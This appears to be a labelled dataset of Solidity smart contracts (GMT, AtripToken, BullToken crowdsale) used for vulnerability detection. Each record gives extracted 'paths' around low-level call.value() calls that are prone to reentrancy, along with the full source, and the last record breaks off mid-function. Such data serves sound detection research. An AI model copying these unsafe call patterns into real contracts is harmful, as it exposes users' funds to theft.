{"sol name": "39973.sol", "label": 1, "first path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _forward(address _to, bytes _data) internal returns(bool, bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return (false, _safeFalse()); if (!_to.call.value(msg.value)(_data)) { return (false, _safeFalse()); return (true, _applyRefund(startGas)); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); ", "second path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _forward(address _to, bytes _data) internal returns(bool, bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return (false, _safeFalse()); if (!_to.call.value(msg.value)(_data)) { return (false, _safeFalse()); return (true, _applyRefund(startGas)); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); ", "third path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _forward(address _to, bytes _data) internal returns(bool, bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return (false, _safeFalse()); if (!_to.call.value(msg.value)(_data)) { return (false, _safeFalse()); return (true, _applyRefund(startGas)); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); ", "long path": "pragma solidity ^0.4.4; contract EtherTreasuryInterface { function withdraw(address _to, uint _value) returns(bool); function withdrawWithReference(address _to, uint _value, string _reference) returns(bool); } contract SafeMin { modifier onlyHuman { if (_isHuman()) { _; } } modifier immutable(address _address) { if (_address == 0) { _; } } function _safeFalse() internal returns(bool) { _safeSend(msg.sender, msg.value); return false; } function _safeSend(address _to, uint _value) internal { if (!_unsafeSend(_to, _value)) { throw; } } function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); } function _isContract() constant internal returns(bool) { return msg.sender != tx.origin; } function _isHuman() constant internal returns(bool) { return !_isContract(); } } contract MultiAsset { function isCreated(bytes32 _symbol) constant returns(bool); function baseUnit(bytes32 _symbol) constant returns(uint8); function name(bytes32 _symbol) constant returns(string); function description(bytes32 _symbol) constant returns(string); function isReissuable(bytes32 _symbol) constant returns(bool); function owner(bytes32 _symbol) constant returns(address); function isOwner(address _owner, bytes32 _symbol) constant returns(bool); function totalSupply(bytes32 _symbol) constant returns(uint); function balanceOf(address _holder, bytes32 _symbol) constant returns(uint); function transfer(address _to, uint _value, bytes32 _symbol) returns(bool); function transferToICAP(bytes32 _icap, uint _value) returns(bool); function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool); function transferWithReference(address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function proxyTransferWithReference(address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function proxyTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool); function approve(address _spender, uint _value, bytes32 _symbol) returns(bool); function proxyApprove(address _spender, uint _value, bytes32 _symbol) returns(bool); function allowance(address _from, address _spender, bytes32 _symbol) constant returns(uint); function transferFrom(address _from, address _to, uint _value, bytes32 _symbol) returns(bool); function transferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function transferFromToICAP(address _from, bytes32 _icap, uint _value) returns(bool); function transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool); function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function proxyTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool); function setCosignerAddress(address _address, bytes32 _symbol) returns(bool); function setCosignerAddressForUser(address _address) returns(bool); function proxySetCosignerAddress(address _address, bytes32 _symbol) returns(bool); } contract AssetMin is SafeMin { event Transfer(address indexed from, address indexed to, uint value); event Approve(address indexed from, address indexed spender, uint value); MultiAsset public multiAsset; bytes32 public symbol; string public name; function init(address _multiAsset, bytes32 _symbol) immutable(address(multiAsset)) returns(bool) { MultiAsset ma = MultiAsset(_multiAsset); if (!ma.isCreated(_symbol)) { return false; } multiAsset = ma; symbol = _symbol; return true; } function setName(string _name) returns(bool) { if (bytes(name).length != 0) { return false; } name = _name; return true; } modifier onlyMultiAsset() { if (msg.sender == address(multiAsset)) { _; } } function totalSupply() constant returns(uint) { return multiAsset.totalSupply(symbol); } function balanceOf(address _owner) constant returns(uint) { return multiAsset.balanceOf(_owner, symbol); } function allowance(address _from, address _spender) constant returns(uint) { return multiAsset.allowance(_from, _spender, symbol); } function transfer(address _to, uint _value) returns(bool) { return __transferWithReference(_to, _value, \"\"); } function transferWithReference(address _to, uint _value, string _reference) returns(bool) { return __transferWithReference(_to, _value, _reference); } function __transferWithReference(address _to, uint _value, string _reference) private returns(bool) { return _isHuman() ? multiAsset.proxyTransferWithReference(_to, _value, symbol, _reference) : multiAsset.transferFromWithReference(msg.sender, _to, _value, symbol, _reference); } function transferToICAP(bytes32 _icap, uint _value) returns(bool) { return __transferToICAPWithReference(_icap, _value, \"\"); } function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) { return __transferToICAPWithReference(_icap, _value, _reference); } function __transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) private returns(bool) { return _isHuman() ? multiAsset.proxyTransferToICAPWithReference(_icap, _value, _reference) : multiAsset.transferFromToICAPWithReference(msg.sender, _icap, _value, _reference); } function approve(address _spender, uint _value) onlyHuman() returns(bool) { return multiAsset.proxyApprove(_spender, _value, symbol); } function setCosignerAddress(address _cosigner) onlyHuman() returns(bool) { return multiAsset.proxySetCosignerAddress(_cosigner, symbol); } function emitTransfer(address _from, address _to, uint _value) onlyMultiAsset() { Transfer(_from, _to, _value); } function emitApprove(address _from, address _spender, uint _value) onlyMultiAsset() { Approve(_from, _spender, _value); } function sendToOwner() returns(bool) { address owner = multiAsset.owner(symbol); return multiAsset.transfer(owner, balanceOf(owner), symbol); } function decimals() constant returns(uint8) { return multiAsset.baseUnit(symbol); } } contract Owned { address public contractOwner; function Owned() { contractOwner = msg.sender; } modifier onlyContractOwner() { if (contractOwner == msg.sender) { _; } } } contract GMT is AssetMin, Owned { uint public txGasPriceLimit = 21000000000; uint public refundGas = 40000; uint public transferCallGas = 21000; uint public transferWithReferenceCallGas = 21000; uint public transferToICAPCallGas = 21000; uint public transferToICAPWithReferenceCallGas = 21000; uint public approveCallGas = 21000; uint public forwardCallGas = 21000; uint public setCosignerCallGas = 21000; EtherTreasuryInterface public treasury; mapping(bytes32 => address) public allowedForwards; function updateRefundGas() onlyContractOwner() returns(uint) { uint startGas = msg.gas; uint refund = (startGas - msg.gas + refundGas) * tx.gasprice; if (tx.gasprice > txGasPriceLimit) { return 0; } if (!_refund(1)) { return 0; } refundGas = startGas - msg.gas; return refundGas; } function setOperationsCallGas(uint _transfer,uint _transferToICAP,uint _transferWithReference,uint _transferToICAPWithReference,uint _approve,uint _forward,uint _setCosigner) onlyContractOwner() returns(bool) { transferCallGas = _transfer; transferToICAPCallGas = _transferToICAP; transferWithReferenceCallGas = _transferWithReference; transferToICAPWithReferenceCallGas = _transferToICAPWithReference; approveCallGas = _approve; forwardCallGas = _forward; setCosignerCallGas = _setCosigner; return true; } function setupTreasury(address _treasury, uint _txGasPriceLimit) payable onlyContractOwner() returns(bool) { if (_txGasPriceLimit == 0) { return _safeFalse(); } treasury = EtherTreasuryInterface(_treasury); txGasPriceLimit = _txGasPriceLimit; if (msg.value > 0) { _safeSend(_treasury, msg.value); } return true; } function setForward(bytes4 _msgSig, address _forward) onlyContractOwner() returns(bool) { allowedForwards[sha3(_msgSig)] = _forward; return true; } function _stringGas(string _string) constant internal returns(uint) { return bytes(_string).length * 75; } function _applyRefund(uint _startGas) internal returns(bool) { if (tx.gasprice > txGasPriceLimit) { return false; } uint refund = (_startGas - msg.gas + refundGas) * tx.gasprice; return _refund(refund); } function _refund(uint _value) internal returns(bool) { return address(treasury) != 0 && treasury.withdraw(tx.origin, _value); } function _transfer(address _to, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + transferCallGas; if (!super.transfer(_to, _value)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferToICAP(bytes32 _icap, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + transferToICAPCallGas; if (!super.transferToICAP(_icap, _value)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferWithReference(address _to, uint _value, string _reference) internal returns(bool, bool) { uint startGas = msg.gas + transferWithReferenceCallGas + _stringGas(_reference); if (!super.transferWithReference(_to, _value, _reference)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) internal returns(bool, bool) { uint startGas = msg.gas + transferToICAPWithReferenceCallGas + _stringGas(_reference); if (!super.transferToICAPWithReference(_icap, _value, _reference)) { return (false, false); } return (true, _applyRefund(startGas)); } function _approve(address _spender, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + approveCallGas; if (!super.approve(_spender, _value)) { return (false, false); } return (true, _applyRefund(startGas)); } function _setCosignerAddress(address _cosigner) internal returns(bool, bool) { uint startGas = msg.gas + setCosignerCallGas; if (!super.setCosignerAddress(_cosigner)) { return (false, false); } return (true, _applyRefund(startGas)); } function transfer(address _to, uint _value) returns(bool) { bool success; (success,) = _transfer(_to, _value); return success; } function transferToICAP(bytes32 _icap, uint _value) returns(bool) { bool success; (success,) = _transferToICAP(_icap, _value); return success; } function transferWithReference(address _to, uint _value, string _reference) returns(bool) { bool success; (success,) = _transferWithReference(_to, _value, _reference); return success; } function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) { bool success; (success,) = _transferToICAPWithReference(_icap, _value, _reference); return success; } function approve(address _spender, uint _value) returns(bool) { bool success; (success,) = _approve(_spender, _value); return success; } function setCosignerAddress(address _cosigner) returns(bool) { bool success; (success,) = _setCosignerAddress(_cosigner); return success; } function checkTransfer(address _to, uint _value) constant returns(bool, bool) { return _transfer(_to, _value); } function checkTransferToICAP(bytes32 _icap, uint _value) constant returns(bool, bool) { return _transferToICAP(_icap, _value); } function checkTransferWithReference(address _to, uint _value, string _reference) constant returns(bool, bool) { return _transferWithReference(_to, _value, _reference); } function checkTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) constant returns(bool, bool) { return _transferToICAPWithReference(_icap, _value, _reference); } function checkApprove(address _spender, uint _value) constant returns(bool, bool) { return _approve(_spender, _value); } function checkSetCosignerAddress(address _cosigner) constant returns(bool, bool) { return _setCosignerAddress(_cosigner); } function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); } function _forward(address _to, bytes _data) internal returns(bool, bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return (false, _safeFalse()); } if (!_to.call.value(msg.value)(_data)) { return (false, _safeFalse()); } return (true, _applyRefund(startGas)); } function () payable { _forward(allowedForwards[sha3(msg.sig)], msg.data); } } "}
{"sol name": "10715.sol", "label": 1, "first path": "function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract AtripToken is ERC827Token { using SafeMath for uint256; string public name = \"Atrip Token\"; string public symbol = \"APK\"; uint public decimals = 18; address public wallet = 0x0; ", "second path": "function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract AtripToken is ERC827Token { using SafeMath for uint256; string public name = \"Atrip Token\"; string public symbol = \"APK\"; uint public decimals = 18; address public wallet = 0x0; ", "third path": "function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract AtripToken is ERC827Token { using SafeMath for uint256; string public name = \"Atrip Token\"; string public symbol = \"APK\"; uint public decimals = 18; address public wallet = 0x0; ", "long path": "pragma solidity ^0.4.24; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval( address indexed owner, address indexed spender, uint256 value ); } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = ( allowed[msg.sender][_spender].add(_addedValue)); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract ERC827 is ERC20 { function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool); function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool); function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool); } contract ERC827Token is ERC827, StandardToken { function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; } function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; } function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; } function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; } function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; } } contract AtripToken is ERC827Token { using SafeMath for uint256; string public name = \"Atrip Token\"; string public symbol = \"APK\"; uint public decimals = 18; address public wallet = 0x0; constructor (address _wallet) public  { wallet = _wallet; totalSupply_ = 21 * 100000000 * 10 ** decimals; balances[wallet] = totalSupply_; } function() public{ revert(); } } "}
{"sol name": "30460.sol", "label": 0, "first path": "function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.call.value(this.balance)(); function forwardFunds() onlyOwner public { require(this.balance > 0); wallet.call.value(this.balance)(); contract FinalizableCrowdsale is BurnableCrowdsale, Ownable { using SafeMath for uint256; bool public isFinalized = false; event Finalized(); function forwardFundsToWallet(uint256 amount) internal { if (goalReached() && vault.balance > 0) { vault.forwardFunds(); if (goalReached()) { wallet.call.value(amount)(); } else { vault.deposit.value(amount)(msg.sender); ", "second path": "function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.call.value(this.balance)(); function forwardFunds() onlyOwner public { require(this.balance > 0); wallet.call.value(this.balance)(); contract FinalizableCrowdsale is BurnableCrowdsale, Ownable { using SafeMath for uint256; bool public isFinalized = false; event Finalized(); function forwardFundsToWallet(uint256 amount) internal { if (goalReached() && vault.balance > 0) { vault.forwardFunds(); if (goalReached()) { wallet.call.value(amount)(); } else { vault.deposit.value(amount)(msg.sender); ", "third path": "function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.call.value(this.balance)(); function forwardFunds() onlyOwner public { require(this.balance > 0); wallet.call.value(this.balance)(); contract FinalizableCrowdsale is BurnableCrowdsale, Ownable { using SafeMath for uint256; bool public isFinalized = false; event Finalized(); function forwardFundsToWallet(uint256 amount) internal { if (goalReached() && vault.balance > 0) { vault.forwardFunds(); if (goalReached()) { wallet.call.value(amount)(); } else { vault.deposit.value(amount)(msg.sender); ", "long path": "pragma solidity ^0.4.18; contract ERC20Basic { uint256 public totalSupply; function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract BurnableToken is StandardToken { event Burn(address indexed burner, uint256 value); function burn(uint256 _value) public { require(_value > 0); require(_value <= balances[msg.sender]); address burner = msg.sender; balances[burner] = balances[burner].sub(_value); totalSupply = totalSupply.sub(_value); Burn(burner, _value); } } contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function pause() onlyOwner whenNotPaused public { paused = true; Pause(); } function unpause() onlyOwner whenPaused public { paused = false; Unpause(); } } contract PausableToken is StandardToken, Pausable { function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) { return super.transfer(_to, _value); } function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) { return super.transferFrom(_from, _to, _value); } function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) { return super.approve(_spender, _value); } function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) { return super.increaseApproval(_spender, _addedValue); } function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) { return super.decreaseApproval(_spender, _subtractedValue); } } contract BullToken is BurnableToken, PausableToken { string public constant name = \"BullToken\"; string public constant symbol = \"BULL\"; uint256 public constant decimals = 18; uint256 public constant INITIAL_SUPPLY = 55000000; bool public transferEnabled; mapping (address => bool) public isHolder; address [] public holders; function BullToken() public { totalSupply = INITIAL_SUPPLY * 10 ** uint256(decimals); balances[msg.sender] = totalSupply; transferEnabled = false; } function enableTransfers() onlyOwner public { transferEnabled = true; TransferEnabled(); } function disableTransfers() onlyOwner public { transferEnabled = false; TransferDisabled(); } function transfer(address to, uint256 value) public returns (bool) { require(transferEnabled || msg.sender == owner); if (!isHolder[to]) { holders.push(to); isHolder[to] = true; } return super.transfer(to, value); } function transferFrom(address from, address to, uint256 value) public returns (bool) { require(transferEnabled || from == owner); if (!isHolder[to]) { holders.push(to); isHolder[to] = true; } return super.transferFrom(from, to, value); } event TransferEnabled(); event TransferDisabled(); } contract Curatable is Ownable { address public curator; event CurationRightsTransferred(address indexed previousCurator, address indexed newCurator); function Curatable() public { owner = msg.sender; curator = owner; } modifier onlyCurator() { require(msg.sender == curator); _; } function transferCurationRights(address newCurator) public onlyOwner { require(newCurator != address(0)); CurationRightsTransferred(curator, newCurator); curator = newCurator; } } contract Whitelist is Curatable { mapping (address => bool) public whitelist; function Whitelist() public { } function addInvestor(address investor) external onlyCurator { require(investor != 0x0 && !whitelist[investor]); whitelist[investor] = true; } function removeInvestor(address investor) external onlyCurator { require(investor != 0x0 && whitelist[investor]); whitelist[investor] = false; } function isWhitelisted(address investor) constant external returns (bool result) { return whitelist[investor]; } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract BurnableCrowdsale { using SafeMath for uint256; BurnableToken public token; uint256 public startTime; uint256 public endTime; address public wallet; uint256 public rate; uint256 public weiRaised; address public tokenAddress; event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount); function BurnableCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, address _tokenAddress) public { require(_startTime >= now); require(_endTime >= _startTime); require(_rate > 0); require(_wallet != address(0)); tokenAddress = _tokenAddress; token = createTokenContract(); startTime = _startTime; endTime = _endTime; rate = _rate; wallet = _wallet; } function createTokenContract() internal returns (BurnableToken) { return new BurnableToken(); } function () external payable { buyTokens(msg.sender); } function buyTokens(address beneficiary) public payable { } function forwardFunds() internal { } function validPurchase() internal view returns (bool) { bool withinPeriod = now >= startTime && now <= endTime; bool nonZeroPurchase = msg.value != 0; return withinPeriod && nonZeroPurchase; } function hasEnded() public view returns (bool) { return now > endTime; } } contract CappedCrowdsale is BurnableCrowdsale { using SafeMath for uint256; uint256 public cap; function CappedCrowdsale(uint256 _cap) public { require(_cap > 0); cap = _cap; } function validPurchase() internal view returns (bool) { bool withinCap = weiRaised.add(msg.value) <= cap; return super.validPurchase() && withinCap; } function hasEnded() public view returns (bool) { bool capReached = weiRaised >= cap; return super.hasEnded() || capReached; } } contract RefundVault is Ownable { using SafeMath for uint256; enum State { Active, Refunding, Closed } mapping (address => uint256) public deposited; address public wallet; State public state; event Closed(); event RefundsEnabled(); event Refunded(address indexed beneficiary, uint256 weiAmount); function RefundVault(address _wallet) public { require(_wallet != address(0)); wallet = _wallet; state = State.Active; } function deposit(address investor) onlyOwner public payable { require(state == State.Active); deposited[investor] = deposited[investor].add(msg.value); } function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.transfer(this.balance); } function enableRefunds() onlyOwner public { require(state == State.Active); state = State.Refunding; RefundsEnabled(); } function refund(address investor) public { require(state == State.Refunding); uint256 depositedValue = deposited[investor]; deposited[investor] = 0; investor.transfer(depositedValue); Refunded(investor, depositedValue); } } contract BullTokenRefundVault is RefundVault { function BullTokenRefundVault(address _wallet) public RefundVault(_wallet) {} function close() onlyOwner public { require(state == State.Active); state = State.Closed; Closed(); wallet.call.value(this.balance)(); } function forwardFunds() onlyOwner public { require(this.balance > 0); wallet.call.value(this.balance)(); } } contract FinalizableCrowdsale is BurnableCrowdsale, Ownable { using SafeMath for uint256; bool public isFinalized = false; event Finalized(); function finalize() onlyOwner public { require(!isFinalized); require(hasEnded()); finalization(); Finalized(); isFinalized = true; } function finalization() internal { } } contract RefundableCrowdsale is FinalizableCrowdsale { using SafeMath for uint256; uint256 public goal; BullTokenRefundVault public vault; function RefundableCrowdsale(uint256 _goal) public { require(_goal > 0); vault = new BullTokenRefundVault(wallet); goal = _goal; } function forwardFunds() internal { vault.deposit.value(msg.value)(msg.sender); } function claimRefund() public { require(isFinalized); require(!goalReached()); vault.refund(msg.sender); } function finalization() internal { if (goalReached()) { vault.close(); } else { vault.enableRefunds(); } super.finalization(); } function goalReached() public view returns (bool) { return weiRaised >= goal; } } contract BullTokenCrowdsale is CappedCrowdsale, RefundableCrowdsale { using SafeMath for uint256; Whitelist public whitelist; uint256 public minimumInvestment; function BullTokenCrowdsale( uint256 _startTime, uint256 _endTime, uint256 _rate, uint256 _goal, uint256 _cap, uint256 _minimumInvestment, address _tokenAddress, address _wallet, address _whitelistAddress ) public CappedCrowdsale(_cap) FinalizableCrowdsale() RefundableCrowdsale(_goal) BurnableCrowdsale(_startTime, _endTime, _rate, _wallet, _tokenAddress) { require(_goal <= _cap); whitelist = Whitelist(_whitelistAddress); minimumInvestment = _minimumInvestment; } function createTokenContract() internal returns (BurnableToken) { return BullToken(tokenAddress); } function () external payable { buyTokens(msg.sender); } function buyTokens(address beneficiary) public payable { require(beneficiary != address(0)); require(whitelist.isWhitelisted(beneficiary)); uint256 weiAmount = msg.value; uint256 raisedIncludingThis = weiRaised.add(weiAmount); if (raisedIncludingThis > cap) { require(hasStarted() && !hasEnded()); uint256 toBeRefunded = raisedIncludingThis.sub(cap); weiAmount = cap.sub(weiRaised); beneficiary.transfer(toBeRefunded); } else { require(validPurchase()); } uint256 tokens = weiAmount.mul(rate); weiRaised = weiRaised.add(weiAmount); token.transferFrom(owner, beneficiary, tokens); TokenPurchase(msg.sender, beneficiary, weiAmount, tokens); forwardFundsToWallet(weiAmount); } function 